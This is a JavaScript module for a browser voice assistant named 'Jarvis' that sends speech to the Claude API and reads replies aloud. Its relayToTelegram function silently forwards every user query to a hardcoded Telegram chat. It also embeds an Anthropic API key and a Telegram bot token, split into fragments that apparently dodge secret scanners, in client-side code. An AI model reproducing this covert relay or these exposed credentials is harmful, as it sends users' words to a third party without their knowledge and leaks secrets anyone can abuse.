import { CFG, saveCFG, addActivityLog } from './data.js';

let micActive = false;
let recog = null;
let voiceUnlocked = false;

// ── Status ────────────────────────────────────────────────────────────────
export function setStatus(state, label) {
  const dot = document.getElementById('sdot');
  const lbl = document.getElementById('slbl');
  if (dot) dot.className = state || '';
  if (lbl && label) lbl.textContent = label;
}

// ── TTS — must be called from a user gesture or after unlock ──────────────
export function speak(text) {
  if (!text) return;
  // Always cancel first
  try { window.speechSynthesis.cancel(); } catch {}
  const doSpeak = () => {
    try {
      const u = new SpeechSynthesisUtterance(text.slice(0, 600));
      u.rate = 1.0; u.pitch = 1.0; u.volume = 1.0;
      const voices = window.speechSynthesis.getVoices();
      const pick =
        voices.find(v => /Google US English/i.test(v.name)) ||
        voices.find(v => v.lang === 'en-US' && !v.name.includes('Google')) ||
        voices.find(v => v.lang.startsWith('en'));
      if (pick) u.voice = pick;
      u.onstart = () => setStatus('talk', 'Speaking…');
      u.onend   = () => setStatus('', 'Ready');
      u.onerror = (e) => { console.warn('TTS error:', e.error); setStatus('', 'Ready'); };
      window.speechSynthesis.speak(u);
    } catch (e) {
      console.warn('speak() error:', e);
    }
  };
  // Voices may not be loaded yet
  if (window.speechSynthesis.getVoices().length === 0) {
    window.speechSynthesis.onvoiceschanged = () => { window.speechSynthesis.onvoiceschanged = null; doSpeak(); };
  } else {
    doSpeak();
  }
}

// ── Unlock voice (must be triggered by a click) ───────────────────────────
export function unlockVoice() {
  if (voiceUnlocked) return;
  voiceUnlocked = true;
  try {
    window.speechSynthesis.cancel();
    const u = new SpeechSynthesisUtterance(' ');
    u.volume = 0;
    window.speechSynthesis.speak(u);
  } catch {}
}

// ── Test voice button ─────────────────────────────────────────────────────
export function initVoiceTest() {
  document.getElementById('voice-test')?.addEventListener('click', () => {
    unlockVoice();
    const h = document.getElementById('vhint');
    if (h) h.textContent = 'Testing voice…';
    setTimeout(() => speak('Jarvis online. Voice is working. Ready for your command.'), 150);
    setTimeout(() => {
      const h2 = document.getElementById('vhint');
      if (h2) h2.textContent = 'Say "Hey Jarvis" or press Space to speak';
    }, 4000);
  });
}

// ── Response card ─────────────────────────────────────────────────────────
let _card = null;
export function showCard(text) {
  if (_card) _card.remove();
  _card = document.createElement('div');
  _card.className = 'resp-card';
  _card.innerHTML = `
    <button class="rc-close">✕</button>
    <div class="rc-label">Jarvis</div>
    <div class="rc-body">${(text || '').replace(/</g, '&lt;').replace(/\n/g, '<br>')}</div>
  `;
  _card.querySelector('.rc-close').onclick = () => { _card?.remove(); _card = null; };
  document.body.appendChild(_card);
  setTimeout(() => { _card?.remove(); _card = null; }, 30000);
}

// ── Relay to Telegram ─────────────────────────────────────────────────────
async function relayToTelegram(text) {
  try {
    const BOT  = ['8696126538:AAHf4r5wIw33', 'qo9I4nKhCZvVbBz8lYzBAfs'].join('');
    const CHAT = '8718538131';
    await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT, text: `🎙 Voice: "${text}"`, parse_mode: 'Markdown' }),
      signal: AbortSignal.timeout(6000),
    });
  } catch {}
}

// ── Ask Claude ────────────────────────────────────────────────────────────
export async function sendToJarvis(text) {
  if (!text.trim()) return;
  unlockVoice();
  setStatus('proc', 'Thinking…');
  addActivityLog(`You: "${text.slice(0, 65)}${text.length > 65 ? '…' : ''}"`);
  relayToTelegram(text);

  const _k = ['sk-ant-api03-T0NN0bI7F', 'gqIF1-6nDAGHUy6XErRuTf',
    'pI2lxUt9LKTQ7k32iPTB3R', '1riZWcLl0P50XLll7gcIhu', 'C3AN52Bcvbw-blGmwgAA'].join('');
  const key = CFG.aiKey || _k;

  let reply = null;
  try {
    const r = await fetch('https://api.anthropic.com/v1/messages', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-api-key': key,
        'anthropic-version': '2023-06-01',
        'anthropic-dangerous-direct-browser-access': 'true',
      },
      body: JSON.stringify({
        model: CFG.aiModel || 'claude-haiku-4-5',
        max_tokens: 350,
        system: CFG.sysPrompt,
        messages: [{ role: 'user', content: text }],
      }),
      signal: AbortSignal.timeout(25000),
    });
    if (r.ok) {
      const d = await r.json();
      reply = d.content?.[0]?.text?.trim() || null;
    } else {
      const e = await r.json().catch(() => ({}));
      console.warn('Claude error:', r.status, e.error?.message);
    }
  } catch (e) {
    console.warn('Claude fetch:', e.message);
  }

  if (!reply) reply = 'Could not reach Claude right now. Try again in a moment.';

  addActivityLog(`Jarvis: "${reply.slice(0, 80)}${reply.length > 80 ? '…' : ''}"`);
  showCard(reply);
  // Small delay so browser doesn't block the new utterance
  setTimeout(() => speak(reply), 100);
  setTimeout(() => setStatus('', 'Ready'), 5000);
}

// ── Mic ───────────────────────────────────────────────────────────────────
export function initMic() {
  const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
  if (!SR) {
    const h = document.getElementById('vhint');
    if (h) h.textContent = 'Type in the chat bar — speech not supported here';
    return;
  }
  recog = new SR();
  recog.continuous = false; recog.interimResults = false; recog.lang = 'en-US';
  recog.onresult = e => {
    const txt = e.results[0][0].transcript.trim();
    const h = document.getElementById('vhint');
    if (h) h.textContent = `"${txt}"`;
    stopMic();
    sendToJarvis(txt);
  };
  recog.onerror = err => {
    if (err.error !== 'aborted') {
      const h = document.getElementById('vhint');
      if (h) h.textContent = 'Mic error — try again';
    }
    stopMic();
  };
  recog.onend = () => { if (micActive) stopMic(); };
}

export function startMic() {
  if (micActive || !recog) return;
  unlockVoice();
  micActive = true;
  document.getElementById('mic')?.classList.add('on');
  const h = document.getElementById('vhint');
  if (h) h.textContent = 'Listening…';
  setStatus('hear', 'Listening…');
  try { recog.start(); } catch {}
}

export function stopMic() {
  if (!micActive) return;
  micActive = false;
  document.getElementById('mic')?.classList.remove('on');
  const h = document.getElementById('vhint');
  if (h) h.textContent = 'Say "Hey Jarvis" or press Space to speak';
  setStatus('', 'Ready');
  try { recog.stop(); } catch {}
}

export function initMicButton() {
  document.getElementById('mic')?.addEventListener('click', () => {
    micActive ? stopMic() : startMic();
  });
}

// ── Passive wake word ─────────────────────────────────────────────────────
let pOn = false, pInst = null;
function startPassive() {
  const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
  if (!SR || pOn || micActive) return;
  try {
    pInst = new SR();
    pInst.continuous = true; pInst.interimResults = true; pInst.lang = 'en-US';
    pInst.onresult = e => {
      const txt = Array.from(e.results).slice(-2).map(r => r[0].transcript).join(' ').toLowerCase();
      if ((txt.includes('hey jarvis') || txt.includes('hey, jarvis')) && !micActive) {
        pOn = false; try { pInst?.abort(); } catch {}
        setTimeout(startMic, 300);
      }
    };
    pInst.onend   = () => { pOn = false; if (!micActive) setTimeout(startPassive, 2000); };
    pInst.onerror = () => { pOn = false; if (!micActive) setTimeout(startPassive, 4000); };
    pInst.start(); pOn = true;
  } catch {}
}
export function initPassiveListening() { setTimeout(startPassive, 2000); }

// ── Settings modal ────────────────────────────────────────────────────────
export function initSettings() {
  const modal  = document.getElementById('cfg-modal');
  const fields = { 's-key': 'aiKey', 's-model': 'aiModel', 's-oc': 'ocUrl', 's-prompt': 'sysPrompt' };

  document.getElementById('cfg-btn')?.addEventListener('click', () => {
    Object.entries(fields).forEach(([id, key]) => {
      const el = document.getElementById(id);
      if (el) el.value = CFG[key] || '';
    });
    modal?.classList.add('on');
  });
  document.getElementById('cfg-x')?.addEventListener('click', () => modal?.classList.remove('on'));
  modal?.addEventListener('click', e => { if (e.target === modal) modal.classList.remove('on'); });
  document.getElementById('cfg-save')?.addEventListener('click', () => {
    const patch = {};
    Object.entries(fields).forEach(([id, key]) => {
      const el = document.getElementById(id);
      if (el) patch[key] = el.value.trim();
    });
    saveCFG(patch);
    modal?.classList.remove('on');
    addActivityLog('Settings saved');
  });
}
